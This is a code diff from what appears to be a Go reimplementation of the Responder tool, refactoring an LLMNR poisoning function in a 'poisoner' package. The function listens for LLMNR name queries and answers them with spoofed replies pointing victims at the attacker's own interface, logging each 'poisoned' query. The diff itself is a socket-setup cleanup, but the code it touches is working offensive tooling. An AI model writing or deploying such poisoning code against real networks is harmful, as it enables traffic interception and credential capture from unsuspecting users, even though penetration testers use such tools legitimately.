@@ -1,11 +1,9 @@
 package poisoner
 
 import (
-	"context"
 	"encoding/binary"
 	"fmt"
 	"net"
-	"syscall"
 
 	"go-responder/internal/analyzer"
 	"go-responder/internal/core"
@@ -21,26 +19,12 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		return
 	}
 	groupIP := net.ParseIP(llmnrMulticast).To4()
-	ip4 := ifaceIP.To4()
-
-	lc := net.ListenConfig{
-		Control: func(network, address string, c syscall.RawConn) error {
-			var ctlErr error
-			c.Control(func(fd uintptr) {
-				mreq := &syscall.IPMreqn{
-					Multiaddr: [4]byte{groupIP[0], groupIP[1], groupIP[2], groupIP[3]},
-					Ifindex:   int32(iface.Index),
-				}
-				if ctlErr = syscall.SetsockoptIPMreqn(int(fd), syscall.IPPROTO_IP, syscall.IP_ADD_MEMBERSHIP, mreq); ctlErr != nil {
-					return
-				}
-
-				ctlErr = syscall.SetsockoptInet4Addr(int(fd), syscall.IPPROTO_IP, syscall.IP_MULTICAST_IF, [4]byte{ip4[0], ip4[1], ip4[2], ip4[3]})
-			})
-			return ctlErr
-		},
+	if groupIP == nil {
+		core.LogError("LLMNR: bad multicast address %q", llmnrMulticast)
+		return
 	}
-	pc, err := lc.ListenPacket(context.Background(), "udp4", fmt.Sprintf(":%d", llmnrPort))
+
+	pc, err := listenMulticast(iface, ifaceIP, [4]byte{groupIP[0], groupIP[1], groupIP[2], groupIP[3]}, llmnrPort, 0)
 	if err != nil {
 		core.LogError("LLMNR: bind :%d failed (root?) - %v", llmnrPort, err)
 		return
@@ -76,7 +60,7 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		resp := BuildLLMNRResponse(pkt, ifaceIP)
 		if resp != nil {
 			if _, err := conn.WriteToUDP(resp, src); err != nil {
-				core.LogError("[LLMNR] send to %s FAILED: %v", src, err) 
+				core.LogError("[LLMNR] send to %s FAILED: %v", src, err)
 			} else {
 				core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
 			}
